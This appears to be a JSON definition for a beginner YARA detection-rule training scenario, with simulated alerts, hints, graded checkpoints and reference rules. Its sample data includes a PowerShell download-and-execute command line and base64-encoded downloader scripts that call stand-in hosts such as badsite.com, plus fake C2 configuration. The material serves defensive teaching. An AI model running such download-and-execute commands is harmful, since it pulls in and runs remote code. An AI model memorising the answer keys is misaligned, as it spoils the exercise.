@@ -1,0 +1,348 @@
+{
+  "name": "Introduction to YARA Rules — Your First Detection Rules",
+  "description": "Learn the basics of YARA rule writing for malware detection. Start with simple string matching, progress to multiple strings with conditions, and finish by combining strings with file properties. A gentle, guided introduction with helpful feedback when you get stuck.",
+  "difficulty": "BEGINNER",
+  "category": "Threat Detection",
+  "mitreAttackIds": ["T1059.001", "T1105"],
+  "briefing": "## Welcome to YARA Rule Writing!\n\nIn this beginner-friendly scenario, you will learn to write **YARA rules** — the industry-standard tool for identifying and classifying malware.\n\nYou'll work through 3 stages:\n\n1. **Your First YARA Rule** — Match a single malicious string in a file\n2. **Multiple Strings & Conditions** — Combine 2-3 strings with `any of them`\n3. **File Properties** — Use `filesize` and PE header checks\n\nFor each stage, you'll see **sample files** with previews of their contents. Write a YARA rule that **matches the malicious samples** and **does NOT match the benign ones**.\n\nUse the **Test Rule** button to check your rule before submitting!\n\n**Don't worry if you get stuck** — hints are available at each stage, and if you answer incorrectly you'll see the correct answer with an explanation so you can learn and try again.\n\n**Tip:** Start simple. Get the rule compiling first, then refine it.",
+  "lessonContent": "# Introduction to YARA Rules\n\nBefore you begin, let's cover the basics of YARA.\n\n---\n\n## What is YARA?\n\nYARA is a tool that helps security analysts **find and classify malware** by searching for patterns in files. Think of it like writing a search query, but instead of searching the web, you're searching inside files for suspicious content. SOC analysts use YARA to scan endpoints, classify samples, and hunt for threats.\n\n---\n\n## Rule Structure\n\nEvery YARA rule has three main sections:\n\n```\nrule my_first_rule {\n    meta:\n        author = \"Your Name\"\n        description = \"What this rule detects\"\n\n    strings:\n        $s1 = \"suspicious text\"\n\n    condition:\n        $s1\n}\n```\n\n- **meta** — Information about the rule (who wrote it, what it does). Not used for matching.\n- **strings** — The patterns you want to search for inside files.\n- **condition** — The logic that decides when the rule should \"fire\" (match a file).\n\n---\n\n## Text Strings\n\nText strings are the simplest patterns in YARA:\n\n```\n$s1 = \"malware\"\n$s2 = \"cmd.exe\" nocase\n```\n\n- Put the text in double quotes\n- Add `nocase` after the string to match regardless of upper/lower case (e.g., \"MALWARE\", \"Malware\", \"malware\" all match)\n\n---\n\n## Basic Conditions\n\nConditions tell YARA when to match. Here are the ones you'll use in this scenario:\n\n```\ncondition:\n    $s1                    // Match if $s1 is found in the file\n    $s1 and $s2            // Match if BOTH are found\n    $s1 or $s2             // Match if EITHER is found\n    any of them            // Match if ANY defined string is found\n    all of them            // Match if ALL defined strings are found\n    2 of ($s*)             // Match if at least 2 strings starting with $s are found\n```\n\n---\n\n## File Properties\n\nYou can also check properties of the file itself:\n\n```\ncondition:\n    filesize < 100KB                // File is smaller than 100 kilobytes\n    uint16(0) == 0x5A4D             // First 2 bytes are 'MZ' (Windows executable)\n```\n\n`uint16(0) == 0x5A4D` checks if a file starts with the bytes `4D 5A` (\"MZ\"), which is the magic header for Windows PE (.exe) files. This is useful for writing rules that only match executables.\n\n---\n\n## 3 Tips for Beginners\n\n1. **Look at the sample previews** — Compare the malicious and benign files to find strings that are unique to the malicious one.\n2. **Start with one string** — Get your rule compiling and matching first, then add more strings.\n3. **Use the Test button** — Always test before submitting. It shows you exactly which files matched.\n\n---\n\nClick **Continue to Investigation** to start writing your first YARA rule!",
+  "estimatedMinutes": 30,
+  "isActive": true,
+  "stages": [
+    {
+      "stageNumber": 1,
+      "title": "Your First YARA Rule — Single String Match",
+      "description": "Write the simplest possible YARA rule — find one unique string in a malicious file. Compare the malicious and benign sample previews to spot the difference, then write a rule that matches only the malicious file.",
+      "unlockCondition": "AFTER_PREVIOUS",
+      "logs": [
+        {
+          "logType": "SIEM_ALERT",
+          "summary": "SIEM Alert — A suspicious text file was found on a workstation. The file appears to contain a callback URL pointing to a known malicious command-and-control server: evil-c2-server.com.",
+          "rawLog": {
+            "alertId": "TI-2026-0101",
+            "ruleName": "Threat Intel IOC Match",
+            "severity": "HIGH",
+            "timestamp": "2026-02-17T09:00:00Z",
+            "description": "Threat intelligence feed flagged a file containing a known malicious C2 callback URL. The domain evil-c2-server.com has been associated with data exfiltration campaigns. A detection rule is needed to scan other endpoints for similar files.",
+            "iocType": "domain",
+            "iocValue": "evil-c2-server.com",
+            "source": "Threat Intel Feed",
+            "tags": ["c2-callback", "data-exfiltration"]
+          },
+          "severity": "HIGH",
+          "hostname": "SIEM-01",
+          "timestamp": "2026-02-17T09:00:00Z",
+          "isEvidence": true,
+          "evidenceTag": "threat-intel-c2-domain",
+          "sortOrder": 1
+        },
+        {
+          "logType": "EDR_ALERT",
+          "summary": "EDR Alert — File 'config.txt' on workstation WS-HR03 contains a URL referencing evil-c2-server.com. The file was dropped in the user's temp directory.",
+          "rawLog": {
+            "alertId": "EDR-2026-0201",
+            "severity": "HIGH",
+            "timestamp": "2026-02-17T09:10:00Z",
+            "hostname": "WS-HR03",
+            "username": "m.johnson",
+            "alertType": "Suspicious File Content",
+            "filePath": "C:\\Users\\m.johnson\\AppData\\Local\\Temp\\config.txt",
+            "description": "Text file containing URL callback to known malicious domain. File was likely dropped by a first-stage loader."
+          },
+          "severity": "HIGH",
+          "hostname": "WS-HR03",
+          "username": "m.johnson",
+          "timestamp": "2026-02-17T09:10:00Z",
+          "isEvidence": true,
+          "evidenceTag": "suspicious-config-file",
+          "sortOrder": 2
+        }
+      ],
+      "hints": [
+        {
+          "content": "Look at the preview strings for both files. What string appears in the malicious file but NOT in the benign one? The C2 server domain is a great unique indicator.",
+          "pointsPenalty": 1,
+          "sortOrder": 1
+        },
+        {
+          "content": "Here's the structure you need:\n\nrule detect_c2_config {\n    strings:\n        $s1 = \"evil-c2-server.com\"\n    condition:\n        $s1\n}\n\nThis matches any file containing the string \"evil-c2-server.com\".",
+          "pointsPenalty": 2,
+          "sortOrder": 2
+        }
+      ]
+    },
+    {
+      "stageNumber": 2,
+      "title": "Multiple Strings & Basic Conditions",
+      "description": "Write a YARA rule that uses 2-3 strings and a condition like 'any of them' or '2 of ($s*)' to detect a PowerShell downloader script. You'll need to match multiple variants while avoiding false positives.",
+      "unlockCondition": "AFTER_PREVIOUS",
+      "logs": [
+        {
+          "logType": "SYSMON",
+          "summary": "Sysmon Event ID 1 — PowerShell process launched with suspicious arguments. The script uses Net.WebClient and DownloadString to fetch a remote payload.",
+          "rawLog": {
+            "EventID": 1,
+            "Source": "Microsoft-Windows-Sysmon",
+            "UtcTime": "2026-02-17T10:30:00Z",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -nop -exec bypass -c \"(New-Object Net.WebClient).DownloadString('http://badsite.com/payload.ps1')\"",
+            "ParentImage": "C:\\Windows\\explorer.exe",
+            "User": "CORP\\t.williams",
+            "Hashes": "SHA256=def456"
+          },
+          "severity": "HIGH",
+          "hostname": "WS-MKT01",
+          "username": "t.williams",
+          "processName": "powershell.exe",
+          "eventId": "1",
+          "timestamp": "2026-02-17T10:30:00Z",
+          "isEvidence": true,
+          "evidenceTag": "ps-downloader-execution",
+          "sortOrder": 1
+        },
+        {
+          "logType": "EDR_ALERT",
+          "summary": "EDR Alert — Multiple PowerShell downloader scripts collected. They share common patterns: 'DownloadString' and 'Net.WebClient' appear in one variant, while another uses 'Invoke-WebRequest'. Write a rule that catches both.",
+          "rawLog": {
+            "alertId": "EDR-2026-0305",
+            "severity": "HIGH",
+            "timestamp": "2026-02-17T10:35:00Z",
+            "hostname": "WS-MKT01",
+            "username": "t.williams",
+            "processName": "powershell.exe",
+            "alertType": "PowerShell Downloader Detected",
+            "description": "Two downloader script variants collected. Variant A uses Net.WebClient + DownloadString. Variant B uses Invoke-WebRequest + DownloadString. Both contain DownloadString. A rule matching at least one download method plus DownloadString would catch both.",
+            "mitreTactic": "Execution",
+            "mitreTechnique": "T1059.001"
+          },
+          "severity": "HIGH",
+          "hostname": "WS-MKT01",
+          "username": "t.williams",
+          "processName": "powershell.exe",
+          "timestamp": "2026-02-17T10:35:00Z",
+          "isEvidence": true,
+          "evidenceTag": "edr-ps-downloader-variants",
+          "sortOrder": 2
+        }
+      ],
+      "hints": [
+        {
+          "content": "Look for strings that the malicious scripts share but the benign script does NOT have. 'DownloadString' appears in both malicious samples. 'Net.WebClient' and 'Invoke-WebRequest' each appear in one variant.",
+          "pointsPenalty": 1,
+          "sortOrder": 1
+        },
+        {
+          "content": "Define all three indicator strings, then use '2 of ($s*)' so the rule matches when at least 2 are present. This catches both variants:\n\nrule detect_ps_downloader {\n    strings:\n        $s1 = \"DownloadString\"\n        $s2 = \"Net.WebClient\"\n        $s3 = \"Invoke-WebRequest\"\n    condition:\n        2 of ($s*)\n}",
+          "pointsPenalty": 2,
+          "sortOrder": 2
+        }
+      ]
+    },
+    {
+      "stageNumber": 3,
+      "title": "File Properties & Putting It Together",
+      "description": "Write a YARA rule that combines text strings with file property checks — specifically the PE/MZ header check (uint16(0) == 0x5A4D) and a filesize constraint. This lets you target only Windows executables of a certain size that contain a suspicious marker string.",
+      "unlockCondition": "AFTER_PREVIOUS",
+      "logs": [
+        {
+          "logType": "EDR_ALERT",
+          "summary": "EDR Alert — A suspicious executable was found on WS-FIN02. The PE file contains the string 'MALWARE_CONFIG' which is a known marker used by the PHANTOMLOADER malware family. File size is approximately 45KB.",
+          "rawLog": {
+            "alertId": "EDR-2026-0410",
+            "severity": "CRITICAL",
+            "timestamp": "2026-02-17T11:45:00Z",
+            "hostname": "WS-FIN02",
+            "username": "r.chen",
+            "processName": "svcupdate.exe",
+            "processPath": "C:\\Users\\r.chen\\AppData\\Local\\Temp\\svcupdate.exe",
+            "alertType": "Known Malware Marker Detected",
+            "description": "PE executable contains the embedded marker string 'MALWARE_CONFIG' associated with the PHANTOMLOADER family. File is 45KB. Need a YARA rule to scan other endpoints.",
+            "fileHash": "abc789def012",
+            "mitreTechnique": "T1105"
+          },
+          "severity": "CRITICAL",
+          "hostname": "WS-FIN02",
+          "username": "r.chen",
+          "processName": "svcupdate.exe",
+          "timestamp": "2026-02-17T11:45:00Z",
+          "isEvidence": true,
+          "evidenceTag": "malware-marker-pe",
+          "sortOrder": 1
+        },
+        {
+          "logType": "SIEM_ALERT",
+          "summary": "SIEM Alert — Threat intel update: PHANTOMLOADER malware is a small PE executable (under 100KB) that embeds the string 'MALWARE_CONFIG' as a configuration marker. Only targets Windows executables (MZ header). Write a detection rule using these three properties.",
+          "rawLog": {
+            "alertId": "SIEM-2026-0155",
+            "ruleName": "PHANTOMLOADER Intel Update",
+            "severity": "HIGH",
+            "timestamp": "2026-02-17T11:50:00Z",
+            "description": "PHANTOMLOADER family profile: (1) Windows PE file (starts with MZ header — bytes 4D 5A), (2) Small file size under 100KB, (3) Contains the string 'MALWARE_CONFIG'. Use all three properties for a high-confidence detection rule.",
+            "tags": ["PHANTOMLOADER", "PE", "config-marker"]
+          },
+          "severity": "HIGH",
+          "hostname": "SIEM-01",
+          "timestamp": "2026-02-17T11:50:00Z",
+          "isEvidence": true,
+          "evidenceTag": "phantomloader-intel",
+          "sortOrder": 2
+        }
+      ],
+      "hints": [
+        {
+          "content": "You need three things in your condition: (1) uint16(0) == 0x5A4D to check for a PE/MZ header, (2) filesize < 100KB to match only small files, and (3) your string variable for 'MALWARE_CONFIG'. Combine them with 'and'.",
+          "pointsPenalty": 1,
+          "sortOrder": 1
+        },
+        {
+          "content": "Here's the complete rule:\n\nrule detect_phantomloader {\n    strings:\n        $marker = \"MALWARE_CONFIG\"\n    condition:\n        uint16(0) == 0x5A4D and filesize < 100KB and $marker\n}\n\nuint16(0) == 0x5A4D checks that the first two bytes are 'MZ' (PE executable header).",
+          "pointsPenalty": 2,
+          "sortOrder": 2
+        }
+      ]
+    }
+  ],
+  "checkpoints": [
+    {
+      "stageNumber": 1,
+      "checkpointType": "YARA_RULE",
+      "question": "Write a YARA rule that matches the malicious config file (malicious_config.txt) but does NOT match the benign log file (normal_log.txt). Look at the sample previews — what string is unique to the malicious file?",
+      "options": null,
+      "correctAnswer": {
+        "samples": [
+          {
+            "name": "malicious_config.txt",
+            "content": "W2NvbmZpZ10NCnNlcnZlcj1ldmlsLWMyLXNlcnZlci5jb20NCnBvcnQ9NDQzDQppbnRlcnZhbD02MA0KZXhmaWxfcGF0aD0vdXBsb2FkDQp1c2VyX2FnZW50PU1vemlsbGEvNS4w",
+            "shouldMatch": true,
+            "description": "Configuration file with a callback URL pointing to the known malicious C2 server evil-c2-server.com.",
+            "previewStrings": ["[config]", "server=evil-c2-server.com", "port=443", "interval=60", "exfil_path=/upload"]
+          },
+          {
+            "name": "normal_log.txt",
+            "content": "MjAyNi0wMi0xNyAwODozMDowMCBJTkZPIEFwcGxpY2F0aW9uIHN0YXJ0ZWQNCjIwMjYtMDItMTcgMDg6MzE6MDAgSU5GTyBDb25uZWN0ZWQgdG8gZGF0YWJhc2UNCjIwMjYtMDItMTcgMDg6MzI6MDAgSU5GTyBIZWFsdGggY2hlY2sgcGFzc2VkDQoyMDI2LTAyLTE3IDA4OjMzOjAwIElORk8gUHJvY2Vzc2luZyByZXF1ZXN0cw==",
+            "shouldMatch": false,
+            "description": "Normal application log file with routine startup messages. No malicious content.",
+            "previewStrings": ["2026-02-17 08:30:00 INFO Application started", "2026-02-17 08:31:00 INFO Connected to database", "2026-02-17 08:32:00 INFO Health check passed", "2026-02-17 08:33:00 INFO Processing requests"]
+          }
+        ],
+        "referenceRule": "rule detect_c2_config {\n    strings:\n        $s1 = \"evil-c2-server.com\"\n    condition:\n        $s1\n}"
+      },
+      "points": 10,
+      "category": "accuracy",
+      "explanation": "The malicious config file contains the C2 domain 'evil-c2-server.com' which does not appear in the normal log file. By defining this string in the 'strings' section and requiring it in the 'condition' section, your rule will only match files containing this malicious indicator.",
+      "sortOrder": 1
+    },
+    {
+      "stageNumber": 1,
+      "checkpointType": "MULTIPLE_CHOICE",
+      "question": "What section of a YARA rule defines the patterns to search for inside files?",
+      "options": ["meta", "strings", "condition", "rule"],
+      "correctAnswer": "strings",
+      "points": 5,
+      "category": "accuracy",
+      "explanation": "The 'strings' section is where you define the text, hex, or regex patterns that YARA will search for inside files. The 'meta' section holds informational metadata, the 'condition' section defines the matching logic, and 'rule' is the keyword that starts a rule definition.",
+      "sortOrder": 2
+    },
+    {
+      "stageNumber": 2,
+      "checkpointType": "YARA_RULE",
+      "question": "Write a YARA rule that detects both PowerShell downloader variants (downloader_v1.ps1 and downloader_v2.ps1) but does NOT match the legitimate admin script (admin_script.ps1). The malicious scripts share the string 'DownloadString' and each has a different download method.",
+      "options": null,
+      "correctAnswer": {
+        "samples": [
+          {
+            "name": "downloader_v1.ps1",
+            "content": "JGMgPSBOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQNCiRwYXlsb2FkID0gJGMuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9iYWRzaXRlLmNvbS9wYXlsb2FkLnBzMScpDQpJbnZva2UtRXhwcmVzc2lvbiAkcGF5bG9hZA==",
+            "shouldMatch": true,
+            "description": "PowerShell downloader variant 1: uses Net.WebClient and DownloadString to fetch and execute a remote payload.",
+            "previewStrings": ["Net.WebClient", "DownloadString", "http://badsite.com/payload.ps1", "Invoke-Expression"]
+          },
+          {
+            "name": "downloader_v2.ps1",
+            "content": "JHJlc3BvbnNlID0gSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAnaHR0cDovL2JhZHNpdGUuY29tL3N0YWdlMi5wczEnDQokc2NyaXB0ID0gJHJlc3BvbnNlLkNvbnRlbnQuRG93bmxvYWRTdHJpbmcoKQ0KaWV4ICRzY3JpcHQ=",
+            "shouldMatch": true,
+            "description": "PowerShell downloader variant 2: uses Invoke-WebRequest and DownloadString to fetch and execute a remote payload.",
+            "previewStrings": ["Invoke-WebRequest", "DownloadString", "http://badsite.com/stage2.ps1", "iex"]
+          },
+          {
+            "name": "admin_script.ps1",
+            "content": "IyBJVCBBZG1pbiBTY3JpcHQgLSBTeXN0ZW0gSW52ZW50b3J5DQokY29tcHV0ZXJzID0gR2V0LUFEQ29tcHV0ZXIgLUZpbHRlciAqIC1Qcm9wZXJ0aWVzIE5hbWUsT3BlcmF0aW5nU3lzdGVtDQpmb3JlYWNoICgkcGMgaW4gJGNvbXB1dGVycykgew0KICAgIFdyaXRlLUhvc3QgIiQoJHBjLk5hbWUpIC0gJCgkcGMuT3BlcmF0aW5nU3lzdGVtKSINCn0NCldyaXRlLUhvc3QgIkludmVudG9yeSBjb21wbGV0ZS4i",
+            "shouldMatch": false,
+            "description": "Legitimate IT admin script that collects Active Directory computer inventory. Uses standard AD cmdlets — no download functions.",
+            "previewStrings": ["# IT Admin Script - System Inventory", "Get-ADComputer -Filter *", "Write-Host", "Inventory complete."]
+          }
+        ],
+        "referenceRule": "rule detect_ps_downloader {\n    strings:\n        $s1 = \"DownloadString\"\n        $s2 = \"Net.WebClient\"\n        $s3 = \"Invoke-WebRequest\"\n    condition:\n        2 of ($s*)\n}"
+      },
+      "points": 15,
+      "category": "accuracy",
+      "explanation": "Both malicious scripts contain 'DownloadString' plus one download method (Net.WebClient or Invoke-WebRequest). Using '2 of ($s*)' means the rule fires when at least 2 of the 3 strings are found. Variant 1 matches on DownloadString + Net.WebClient. Variant 2 matches on DownloadString + Invoke-WebRequest. The benign admin script contains none of these strings, so it won't match.",
+      "sortOrder": 1
+    },
+    {
+      "stageNumber": 2,
+      "checkpointType": "TRUE_FALSE",
+      "question": "The YARA condition 'any of them' means at least one defined string must be found in the file for the rule to match.",
+      "options": ["true", "false"],
+      "correctAnswer": "true",
+      "points": 5,
+      "category": "accuracy",
+      "explanation": "'any of them' is a YARA condition that matches when at least one of the defined strings is found in the file. It's equivalent to writing '$s1 or $s2 or $s3 or ...' for all defined strings. The counterpart 'all of them' requires every defined string to be present.",
+      "sortOrder": 2
+    },
+    {
+      "stageNumber": 3,
+      "checkpointType": "YARA_RULE",
+      "question": "Write a YARA rule that detects the PHANTOMLOADER malware. It must match ONLY PE executables (MZ header) that are under 100KB in size AND contain the string 'MALWARE_CONFIG'. Your rule should match the malicious PE file but NOT the benign PE file or the text file.",
+      "options": null,
+      "correctAnswer": {
+        "samples": [
+          {
+            "name": "svcupdate.exe",
+            "content": "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABNQUxXQVJFX0NPTkZJRwAAAABodHRwOi8vYzIucGhhbnRvbWxvYWRlci5jb20vZ2F0ZQAAAABleGZpbHRyYXRl",
+            "shouldMatch": true,
+            "description": "PHANTOMLOADER malware: small PE file (MZ header) containing the 'MALWARE_CONFIG' marker string and a C2 callback URL.",
+            "previewStrings": ["MALWARE_CONFIG", "http://c2.phantomloader.com/gate", "exfiltrate"],
+            "previewHex": "4D 5A 90 00 03 00 00 00"
+          },
+          {
+            "name": "notepad_plugin.exe",
+            "content": "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABOb3RlcGFkKysgUGx1Z2luIHYxLjIuMwBDb3B5cmlnaHQgMjAyNSBBdXRob3IgTmFtZQBodHRwczovL25vdGVwYWQtcGx1cy1wbHVzLm9yZw==",
+            "shouldMatch": false,
+            "description": "Legitimate Notepad++ plugin: PE file with MZ header but no malware marker. Should NOT be matched by your rule.",
+            "previewStrings": ["Notepad++ Plugin v1.2.3", "Copyright 2025 Author Name", "https://notepad-plus-plus.org"],
+            "previewHex": "4D 5A 90 00 03 00 00 00"
+          },
+          {
+            "name": "readme.txt",
+            "content": "V2VsY29tZSB0byB0aGUgYXBwbGljYXRpb24uIFRoaXMgZmlsZSBjb250YWlucyBzZXR1cCBpbnN0cnVjdGlvbnMuIFBsZWFzZSByZWFkIGNhcmVmdWxseSBiZWZvcmUgaW5zdGFsbGluZy4=",
+            "shouldMatch": false,
+            "description": "Plain text README file — no MZ header, no malware content. The uint16(0) == 0x5A4D check should exclude this file.",
+            "previewStrings": ["Welcome to the application.", "This file contains setup instructions.", "Please read carefully before installing."]
+          }
+        ],
+        "referenceRule": "rule detect_phantomloader {\n    strings:\n        $marker = \"MALWARE_CONFIG\"\n    condition:\n        uint16(0) == 0x5A4D and filesize < 100KB and $marker\n}"
+      },
+      "points": 20,
+      "category": "accuracy",
+      "explanation": "This rule combines three checks: (1) uint16(0) == 0x5A4D ensures the file is a PE executable (starts with 'MZ'), filtering out text files and other non-PE formats. (2) filesize < 100KB limits to small files matching the known malware profile. (3) The string 'MALWARE_CONFIG' is the unique marker for this malware family. The benign PE file has the MZ header but no 'MALWARE_CONFIG' string. The text file has neither the MZ header nor the marker.",
+      "sortOrder": 1
+    },
+    {
+      "stageNumber": 3,
+      "checkpointType": "MULTIPLE_CHOICE",
+      "question": "What does the YARA condition 'uint16(0) == 0x5A4D' check for?",
+      "options": [
+        "Whether the file is exactly 0x5A4D bytes in size",
+        "Whether the first two bytes of the file are 'MZ' (a Windows PE executable header)",
+        "Whether the string '5A4D' appears anywhere in the file",
+        "Whether the file has exactly 2 sections"
+      ],
+      "correctAnswer": "Whether the first two bytes of the file are 'MZ' (a Windows PE executable header)",
+      "points": 5,
+      "category": "accuracy",
+      "explanation": "uint16(0) reads a 16-bit (2-byte) unsigned integer at offset 0 (the very start of the file). The value 0x5A4D corresponds to the ASCII characters 'MZ' (note: bytes are stored in little-endian order, so 4D 5A in the file becomes 0x5A4D as a uint16). 'MZ' is the magic header that identifies Windows PE (.exe/.dll) files, named after Mark Zbikowski, one of the original DOS developers.",
+      "sortOrder": 2
+    }
+  ]
+}
